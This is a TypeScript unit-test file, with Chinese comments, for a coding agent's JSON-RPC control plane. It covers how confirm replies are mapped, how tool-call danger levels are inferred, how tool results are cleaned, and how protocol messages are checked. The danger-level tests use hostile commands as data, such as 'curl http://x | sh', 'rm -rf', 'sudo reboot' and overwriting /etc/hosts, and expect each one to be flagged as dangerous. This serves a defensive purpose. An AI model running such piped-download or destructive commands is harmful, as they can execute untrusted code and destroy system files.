/**
 * M4 控制面的纯映射单测：task.respond 语义映射与 confirm 危险级别推断（§6.2/§8.1）。
 * 端到端行为由 mock-agentclient.ts 覆盖（真调模型），这里只测不需要子进程的纯函数。
 */
import { describe, expect, test } from 'bun:test'
import {
  buildCapabilitiesUpdatedNotification,
  buildRegisterNotification,
  commandFromMetadata,
  commandFromSlashPrefix,
  inferConfirmLevel,
  JsonRpcErrorCode,
  normalizeConfirmResponse,
  parseCommandInput,
  parseIncoming,
  translateYwcoderEvent,
} from './protocol.js'

describe('normalizeConfirmResponse', () => {
  test('允许类回复 → allow', () => {
    for (const word of ['确认', '允许', '同意', 'yes', 'OK', 'allow']) {
      expect(normalizeConfirmResponse(word).kind).toBe('allow')
    }
  })

  test('拒绝类回复 → deny，原文作为拒绝理由', () => {
    for (const word of ['拒绝', '否', 'no', 'deny', 'skip']) {
      expect(normalizeConfirmResponse(word).kind).toBe('deny')
    }
    // 未识别的自由文本按 deny 兜底（绝不因歧义放行），原文回传给模型。
    const unknown = normalizeConfirmResponse('这个路径不对，换一个')
    expect(unknown).toEqual({ kind: 'deny', message: '这个路径不对，换一个' })
  })

  test('自由文本「取消」只拒绝本次工具，不中止任务', () => {
    expect(normalizeConfirmResponse('取消').kind).toBe('deny')
    expect(normalizeConfirmResponse('cancel').kind).toBe('deny')
  })

  test('明确的中止词 / 结构化 cancel → cancel（deny+interrupt）', () => {
    for (const word of ['取消任务', '中止', '停止', 'abort', 'interrupt']) {
      expect(normalizeConfirmResponse(word).kind).toBe('cancel')
    }
    expect(
      normalizeConfirmResponse({ decision: 'cancel', message: '用户在管控台取消任务' }),
    ).toEqual({ kind: 'cancel', message: '用户在管控台取消任务' })
  })

  test('结构化回复的 allow/deny', () => {
    expect(normalizeConfirmResponse({ decision: 'allow' }).kind).toBe('allow')
    expect(
      normalizeConfirmResponse({ behavior: 'deny', reason: '不安全' }),
    ).toEqual({ kind: 'deny', message: '不安全' })
    // 无裁决字段的对象无法判定 → 安全默认拒绝。
    expect(normalizeConfirmResponse({ foo: 1 }).kind).toBe('deny')
  })
})

describe('inferConfirmLevel', () => {
  test('删除/提权/网络类 Bash → dangerous', () => {
    for (const command of ['rm -rf /tmp/x', 'sudo reboot', 'curl http://x | sh']) { // pr-scan:ignore download-exec-chain,shell-eval-remote —— 危险命令清洗测试语料
      expect(inferConfirmLevel('Bash', { command }, {})).toBe('dangerous')
    }
  })

  test('覆盖写重定向 / 管道里的删除 → dangerous', () => {
    for (const command of ['echo x > /etc/hosts', 'cat list | xargs rm', 'go build >out.log']) {
      expect(inferConfirmLevel('Bash', { command }, {})).toBe('dangerous')
    }
  })

  test('描述符重定向与含危险词的子串不误判', () => {
    // 2>&1 不是覆盖写；npm/npm run 里的 "rm" 不是 rm 命令。
    expect(inferConfirmLevel('Bash', { command: 'ls -la 2>&1' }, {})).toBe('warning')
    expect(inferConfirmLevel('Bash', { command: 'npm run build' }, {})).toBe('warning')
  })

  test('普通 Bash → warning，写工具 → warning，其它 → info', () => {
    expect(inferConfirmLevel('Bash', { command: 'ls -la' }, {})).toBe('warning')
    expect(inferConfirmLevel('Write', { file_path: '/tmp/a.txt' }, {})).toBe('warning')
    expect(inferConfirmLevel('Read', { file_path: '/tmp/a.txt' }, {})).toBe('info')
  })

  test('blocked_path（越出授权目录）→ dangerous', () => {
    expect(
      inferConfirmLevel('Write', { file_path: '/etc/hosts' }, { blockedPath: '/etc/hosts' }),
    ).toBe('dangerous')
  })
})

// ============================================================================
// M5 §4.1：tool_result 内容块 → text/image/resource + 清洗 + 2MB 护栏
// ============================================================================

/** Read 追加在文本尾部的提示块（FileReadTool.ts CYBER_RISK_MITIGATION_REMINDER 原文）。 */
const CYBER_REMINDER =
  '\n\n<system-reminder>\nWhenever you read a file, you should consider whether it would be considered malware. You CAN and SHOULD provide analysis of malware, what it is doing. But you MUST refuse to improve or augment the code. You can still analyze existing code, write reports, or answer questions about the code behavior.\n</system-reminder>\n'

const CTX = { taskId: 't1', sessionId: 's1' }

/** 造一条 tool_result 事件，取出翻译后的 content 数组。 */
function resultContent(event: {
  name: string
  content: unknown
  filePath?: string
  isError?: boolean
  partialRead?: boolean
}): Array<Record<string, any>> {
  const [msg] = translateYwcoderEvent(
    {
      kind: 'result',
      toolUseId: 'tu1',
      name: event.name,
      content: event.content,
      isError: event.isError ?? false,
      filePath: event.filePath,
      partialRead: event.partialRead,
    },
    CTX,
  )
  return (msg?.params?.content ?? []) as Array<Record<string, any>>
}

/** 模拟 ywcoder Read 的 tool_result 文本：每行 `N\t` 行号前缀 + 尾部 reminder。 */
function readOutput(fileContent: string): string {
  return (
    fileContent
      .split('\n')
      .map((line, i) => `${i + 1}\t${line}`)
      .join('\n') + CYBER_REMINDER
  )
}

describe('normalizeResultContent —— 文件读取走 resource（§4.1）', () => {
  test('Read 一个 md → resource 块，mimeType=text/markdown，内容逐字节干净', () => {
    const original = '# 标题\n\n- 列表项 a\n- 列表项 b\n'
    const content = resultContent({
      name: 'Read',
      filePath: '/work/notes/report.md',
      content: readOutput(original),
    })
    expect(content).toHaveLength(1)
    expect(content[0]).toEqual({
      type: 'resource',
      resource: {
        uri: '/work/notes/report.md',
        mimeType: 'text/markdown',
        text: original,
      },
    })
    // 清洗必须彻底：既无行号前缀，也无 system-reminder 残留。
    expect(content[0]!.resource.text).not.toMatch(/^\d+\t/m)
    expect(content[0]!.resource.text).not.toContain('system-reminder')
  })

  test('mimeType 按扩展名推断，未知扩展名回落 text/plain', () => {
    const mime = (path: string): string =>
      resultContent({ name: 'Read', filePath: path, content: readOutput('a,b\n1,2\n') })[0]!
        .resource.mimeType
    expect(mime('/w/data.csv')).toBe('text/csv')
    expect(mime('/w/pkg.json')).toBe('application/json')
    expect(mime('/w/app.log')).toBe('text/plain')
    expect(mime('/w/a.txt')).toBe('text/plain')
    expect(mime('/w/index.ts')).toBe('text/plain')
    expect(mime('/w/Makefile')).toBe('text/plain')
  })

  test('宽格式行号前缀（`     1→`）同样被剥掉', () => {
    const raw = '     1→line one\n     2→line two'
    const content = resultContent({ name: 'Read', filePath: '/w/a.txt', content: raw })
    expect(content[0]!.resource.text).toBe('line one\nline two')
  })

  test('文件正文里含 </system-reminder> 时只剥尾部那一块', () => {
    const original = '前文 <system-reminder>正文里的</system-reminder> 后文\n'
    const content = resultContent({
      name: 'Read',
      filePath: '/w/a.md',
      content: readOutput(original),
    })
    expect(content[0]!.resource.text).toBe(original)
  })

  test('整段都是 system-reminder（空文件告警）→ 原样发 text，不包 resource', () => {
    const warning =
      '<system-reminder>Warning: the file exists but the contents are empty.</system-reminder>'
    const content = resultContent({ name: 'Read', filePath: '/w/empty.md', content: warning })
    expect(content).toEqual([{ type: 'text', text: warning }])
  })

  test('非文件读取工具 / 报错结果 → 仍是裸 text 块', () => {
    expect(resultContent({ name: 'Bash', content: 'total 8\n' })).toEqual([
      { type: 'text', text: 'total 8\n' },
    ])
    expect(
      resultContent({
        name: 'Read',
        filePath: '/w/huge.csv',
        isError: true,
        content: 'File content (3.0MB) exceeds maximum allowed size',
      }),
    ).toEqual([{ type: 'text', text: 'File content (3.0MB) exceeds maximum allowed size' }])
  })
})

describe('normalizeResultContent —— 图片（§4.1）', () => {
  test('Anthropic 形状（source.data/media_type）→ image 块', () => {
    const content = resultContent({
      name: 'Read',
      filePath: '/w/chart.png',
      content: [
        { type: 'image', source: { type: 'base64', data: 'iVBORw0KGgo=', media_type: 'image/png' } },
      ],
    })
    expect(content).toEqual([{ type: 'image', data: 'iVBORw0KGgo=', mimeType: 'image/png' }])
  })

  test('image 与 resource 并存时只留 image，不重复传', () => {
    const content = resultContent({
      name: 'Read',
      filePath: '/w/chart.png',
      content: [
        { type: 'image', data: 'AAAA', mimeType: 'image/jpeg' },
        { type: 'resource', resource: { uri: '/w/chart.png', mimeType: 'image/jpeg' } },
      ],
    })
    expect(content).toEqual([{ type: 'image', data: 'AAAA', mimeType: 'image/jpeg' }])
  })
})

describe('normalizeResultContent —— 2MB 大小护栏（§4.1）', () => {
  const LIMIT = 2 * 1024 * 1024

  test('超阈值文本 → 截断的 text 块 + 文件名/实际大小/阈值三要素', () => {
    const original = `${'x'.repeat(LIMIT + 500_000)}\n`
    const content = resultContent({
      name: 'Read',
      filePath: '/w/report.csv',
      content: readOutput(original),
    })
    expect(content).toHaveLength(1)
    expect(content[0]!.type).toBe('text')
    const text = content[0]!.text as string
    expect(text).toContain('report.csv') // 文件名
    expect(text).toContain('2.5MB') // 实际大小
    expect(text).toContain('超阈值 2MB') // 阈值
    expect(text).toContain('已截断预览')
    // 未内联全量，且降级后的块本身不超阈值。
    expect(Buffer.byteLength(text, 'utf8')).toBeLessThanOrEqual(LIMIT)
    // 仍保留开头，用户能看前半截。
    expect(text.startsWith('xxxx')).toBe(true)
  })

  test('超阈值图片 → 只发提示，不发 base64', () => {
    const content = resultContent({
      name: 'Read',
      filePath: '/w/big.png',
      content: [{ type: 'image', data: 'A'.repeat(LIMIT + 1), mimeType: 'image/png' }],
    })
    expect(content).toHaveLength(1)
    expect(content[0]!.type).toBe('text')
    expect(content[0]!.text).toContain('图片 big.png')
    expect(content[0]!.text).toContain('未内联预览')
    expect(content[0]!.text).not.toContain('AAAA')
  })

  test('阈值内的内容原样内联', () => {
    const content = resultContent({
      name: 'Read',
      filePath: '/w/ok.txt',
      content: readOutput('y'.repeat(1000)),
    })
    expect(content[0]!.type).toBe('resource')
    expect(content[0]!.resource.text).toBe('y'.repeat(1000))
  })
})

describe('normalizeResultContent —— review 回归（真实 Read 输出的几类形态）', () => {
  test('正文含【未闭合】的 <system-reminder> 开标签，不得从中间剥到末尾', () => {
    // 讲 hook/prompt 的文档就会这么写。旧实现（tempered token 从左找起点）会把
    // 从该开标签起的正文全部静默吃掉。
    const original = '# 说明\n钩子会注入 <system-reminder> 标签\n后面正文\n'
    const content = resultContent({
      name: 'Read',
      filePath: '/w/hooks.md',
      content: readOutput(original),
    })
    expect(content[0]!.resource.text).toBe(original)
  })

  test('notebook 的 text+image 混合块：正文合并成一个 resource，图片保留', () => {
    const content = resultContent({
      name: 'Read',
      filePath: '/w/nb.ipynb',
      content: [
        { type: 'text', text: readOutput('cell 1 源码\n') },
        { type: 'image', source: { type: 'base64', data: 'IMG', media_type: 'image/png' } },
        { type: 'text', text: readOutput('cell 2 源码\n') },
      ],
    })
    expect(content).toHaveLength(2)
    expect(content[0]!.type).toBe('resource')
    // 多个 cell 合成一份正文，而不是多张同 uri 的卡片。
    expect(content[0]!.resource.text).toBe('cell 1 源码\n\ncell 2 源码\n')
    expect(content[1]).toEqual({ type: 'image', data: 'IMG', mimeType: 'image/png' })
  })

  test('image 只与 image/* 的 resource 去重，不吃掉文本类 resource', () => {
    const content = resultContent({
      name: 'Read',
      filePath: '/w/chart.png',
      content: [
        { type: 'image', data: 'AAAA', mimeType: 'image/png' },
        { type: 'resource', resource: { uri: '/w/chart.png', mimeType: 'image/png' } },
        { type: 'resource', resource: { uri: '/w/side.csv', mimeType: 'text/csv', text: 'a,b\n' } },
      ],
    })
    expect(content).toEqual([
      { type: 'image', data: 'AAAA', mimeType: 'image/png' },
      { type: 'resource', resource: { uri: '/w/side.csv', mimeType: 'text/csv', text: 'a,b\n' } },
    ])
  })

  test('桩文本（无行号前缀）不包 resource：unchanged / pdf / 空文件告警', () => {
    const asText = (content: string, filePath: string): unknown =>
      resultContent({ name: 'Read', filePath, content })
    expect(asText('File unchanged since last read. The content from the earlier Read tool_result in this conversation is still current — refer to that instead of re-reading.', '/w/a.md')).toEqual([
      { type: 'text', text: expect.stringContaining('File unchanged') },
    ])
    expect(asText('PDF file read: /w/a.pdf (2.4MB)', '/w/a.pdf')).toEqual([
      { type: 'text', text: 'PDF file read: /w/a.pdf (2.4MB)' },
    ])
    expect(asText('PDF pages extracted: 3 page(s) from /w/a.pdf (2.4MB)', '/w/a.pdf')).toEqual([
      { type: 'text', text: expect.stringContaining('PDF pages extracted') },
    ])
  })

  test('前置的 memoryFreshnessNote（记忆文件时效提示）被剥掉', () => {
    const content = resultContent({
      name: 'Read',
      filePath: '/w/mem.md',
      content:
        '<system-reminder>This memory is 30 days old.</system-reminder>\n' +
        readOutput('记忆正文\n'),
    })
    expect(content[0]!.type).toBe('resource')
    expect(content[0]!.resource.text).toBe('记忆正文\n')
  })

  test('分片读（带 offset/limit）不包 resource，避免把片段当全文展示', () => {
    const content = resultContent({
      name: 'Read',
      filePath: '/w/app.log',
      partialRead: true,
      content: '5000\t日志行 A\n5001\t日志行 B',
    })
    expect(content).toEqual([{ type: 'text', text: '5000\t日志行 A\n5001\t日志行 B' }])
  })
})

// ============================================================================
// v3 P1 协议基线：session_id 严格化、metadata schema、envelope 扩展、命令解析
// ============================================================================

const VALID_SID = '123e4567-e89b-42d3-a456-426614174000'

/** parseIncoming 对非空行不应返回 null；包一层让 TS 收窄掉 null。 */
function parse(line: string) {
  const r = parseIncoming(line)
  if (r === null) throw new Error('parseIncoming 意外返回 null')
  return r
}

function taskCreateLine(overrides: Record<string, unknown> = {}): string {
  return JSON.stringify({
    jsonrpc: '2.0',
    id: 1,
    method: 'task.create',
    params: { task_id: 't1', session_id: VALID_SID, type: 'chat', content: 'hi', ...overrides },
  })
}

describe('v3 task.create session_id 严格校验', () => {
  test('缺失 session_id → -32602', () => {
    const line = JSON.stringify({
      jsonrpc: '2.0', id: 1, method: 'task.create',
      params: { task_id: 't1', type: 'chat', content: 'hi' },
    })
    const r = parse(line)
    expect(r).toMatchObject({ ok: false, code: JsonRpcErrorCode.InvalidParams })
  })

  test('非 UUID / 大写 UUID → -32602', () => {
    for (const sid of ['session-001', VALID_SID.toUpperCase(), '123e4567-e89b-42d3-a456']) {
      const r = parse(taskCreateLine({ session_id: sid }))
      expect(r).toMatchObject({ ok: false, code: JsonRpcErrorCode.InvalidParams })
    }
  })

  test('合法小写 UUID → 通过', () => {
    const r = parse(taskCreateLine())
    expect(r.ok).toBe(true)
    if (r?.ok && r.message.method === 'task.create') {
      expect(r.message.params.session_id).toBe(VALID_SID)
    }
  })
})

describe('v3 task.create metadata 解析', () => {
  test('workdir/group/command 三个已知字段入 schema', () => {
    const r = parse(taskCreateLine({
      metadata: {
        workdir: '/tmp/proj',
        group: {
          group_id: 'g1', group_name: '群', manager_agent_id: 'a1',
          members: [{ agent_id: 'a1', name: '主管' }], mentions: ['a1'],
        },
        command: { name: 'model', args: { model: 'k2' } },
      },
    }))
    expect(r.ok).toBe(true)
    if (r?.ok && r.message.method === 'task.create') {
      expect(r.message.params.metadata?.workdir).toBe('/tmp/proj')
      expect(r.message.params.metadata?.group?.manager_agent_id).toBe('a1')
      expect(r.message.params.metadata?.command?.name).toBe('model')
    }
  })

  test('未知 metadata 字段透传（loose），不阻断协议扩展', () => {
    const r = parse(taskCreateLine({ metadata: { future_field: 1 } }))
    expect(r.ok).toBe(true)
    if (r?.ok && r.message.method === 'task.create') {
      expect((r.message.params.metadata as Record<string, unknown>).future_field).toBe(1)
    }
  })

  test('group 缺必填字段 → -32602', () => {
    const r = parse(taskCreateLine({ metadata: { group: { group_id: 'g1' } } }))
    expect(r).toMatchObject({ ok: false, code: JsonRpcErrorCode.InvalidParams })
  })
})

describe('v3 envelope 扩展：response / subtask_result / 未知消息', () => {
  test('无 method 带 id+result → $response', () => {
    const r = parse(JSON.stringify({ jsonrpc: '2.0', id: 9, result: { ok: 1 } }))
    expect(r).toEqual({ ok: true, message: { method: '$response', id: 9, result: { ok: 1 }, error: undefined } })
  })

  test('无 method 且无 id → Invalid Request', () => {
    const r = parse(JSON.stringify({ jsonrpc: '2.0', result: {} }))
    expect(r).toMatchObject({ ok: false, code: JsonRpcErrorCode.InvalidRequest })
  })

  test('task.subtask_result 全字段被识别（P5 编排关联字段必填）', () => {
    const r = parse(JSON.stringify({
      jsonrpc: '2.0', id: null, method: 'task.subtask_result',
      params: {
        task_id: 'sub1', parent_task_id: 'p1', group_id: 'g1',
        target_agent_id: 'worker-a', status: 'completed',
        chunks: [{ type: 'text', text: 'done' }], error: null,
      },
    }))
    expect(r.ok).toBe(true)
    if (r?.ok) expect(r.message.method).toBe('task.subtask_result')
  })

  test('task.subtask_result 缺关联字段（group_id/target_agent_id）→ Invalid params', () => {
    const r = parse(JSON.stringify({
      jsonrpc: '2.0', id: null, method: 'task.subtask_result',
      params: { task_id: 'sub1', parent_task_id: 'p1', status: 'completed' },
    }))
    expect(r.ok).toBe(false)
    if (r && !r.ok) expect(r.code).toBe(JsonRpcErrorCode.InvalidParams)
  })

  test('task.subtask_result 非法 status → Invalid params', () => {
    const r = parse(JSON.stringify({
      jsonrpc: '2.0', id: null, method: 'task.subtask_result',
      params: {
        task_id: 'sub1', parent_task_id: 'p1', group_id: 'g1',
        target_agent_id: 'worker-a', status: 'running',
      },
    }))
    expect(r.ok).toBe(false)
    if (r && !r.ok) expect(r.code).toBe(JsonRpcErrorCode.InvalidParams)
  })

  test('未知请求（带 id）→ $unknown，由上层回 -32601', () => {
    const r = parse(JSON.stringify({ jsonrpc: '2.0', id: 5, method: 'foo.bar', params: {} }))
    expect(r).toEqual({ ok: true, message: { method: '$unknown', id: 5, methodName: 'foo.bar' } })
  })

  test('未知通知（无 id）→ $unknown，上层只记日志不回 error', () => {
    const r = parse(JSON.stringify({ jsonrpc: '2.0', method: 'foo.bar' }))
    expect(r).toEqual({ ok: true, message: { method: '$unknown', id: null, methodName: 'foo.bar' } })
  })
})

describe('v3 lifecycle.initialize agentInfo', () => {
  test('agentInfo.agent_id 被解析（C3 实例身份）', () => {
    const r = parse(JSON.stringify({
      jsonrpc: '2.0', id: 1, method: 'lifecycle.initialize',
      params: { protocolVersion: '1.0.0', agentInfo: { agent_id: 'agent-xyz' } },
    }))
    expect(r.ok).toBe(true)
    if (r?.ok && r.message.method === 'lifecycle.initialize') {
      expect(r.message.params.agentInfo?.agent_id).toBe('agent-xyz')
    }
  })

  test('不带 agentInfo 也兼容（旧 client）', () => {
    const r = parse(JSON.stringify({
      jsonrpc: '2.0', id: 1, method: 'lifecycle.initialize',
      params: { protocolVersion: '1.0.0' },
    }))
    expect(r.ok).toBe(true)
  })
})

describe('命令解析双通道', () => {
  test('metadata.command 结构化通道：args 首个字符串值 → value', () => {
    expect(commandFromMetadata({ name: 'model', args: { model: 'kimi-k2' } }))
      .toEqual({ name: 'model', value: 'kimi-k2' })
    expect(commandFromMetadata({ name: 'compact', args: { text: '只保留接口' } }))
      .toEqual({ name: 'compact', text: '只保留接口' })
    expect(commandFromMetadata({ name: 'model' })).toEqual({ name: 'model' })
    expect(commandFromMetadata(undefined)).toBeNull()
    expect(commandFromMetadata({ name: '  ' })).toBeNull()
  })

  test('斜杠前缀退化通道', () => {
    expect(commandFromSlashPrefix('/model kimi-k2')).toEqual({ name: 'model', value: 'kimi-k2', text: 'kimi-k2' })
    expect(commandFromSlashPrefix('/compact 保留 接口 说明')).toEqual({ name: 'compact', text: '保留 接口 说明' })
    expect(commandFromSlashPrefix('/model')).toEqual({ name: 'model' })
    expect(commandFromSlashPrefix('普通文本')).toBeNull()
    expect(commandFromSlashPrefix('/')).toBeNull()
  })

  test('parseCommandInput：metadata.command 优先于 content 前缀', () => {
    const cmd = parseCommandInput({
      content: '/permission default',
      metadata: { command: { name: 'model', args: { model: 'k2' } } },
    })
    expect(cmd).toEqual({ name: 'model', value: 'k2' })
    expect(parseCommandInput({ content: '/permission default' })).toMatchObject({ name: 'permission', value: 'default' })
    expect(parseCommandInput({ content: '你好' })).toBeNull()
  })
})

describe('两级 capabilities 构造（C1）', () => {
  const caps = [
    { type: 'command' as const, name: 'model', description: '切换模型',
      metadata: { current: 'k2', args: [{ name: 'model', type: 'enum' as const, options: ['k2'], required: true }] } },
  ]

  test('register 携带动态 capabilities', () => {
    const msg = buildRegisterNotification(caps)
    expect(msg.method).toBe('lifecycle.register')
    expect((msg.params as { capabilities: unknown[] }).capabilities).toHaveLength(1)
  })

  test('capabilities_updated 不带 session_id = 全局快照', () => {
    const msg = buildCapabilitiesUpdatedNotification(caps)
    expect(msg.method).toBe('lifecycle.capabilities_updated')
    expect(msg.params).not.toHaveProperty('session_id')
  })

  test('capabilities_updated 带 session_id = 会话级快照', () => {
    const msg = buildCapabilitiesUpdatedNotification(caps, VALID_SID)
    expect((msg.params as { session_id: string }).session_id).toBe(VALID_SID)
  })
})
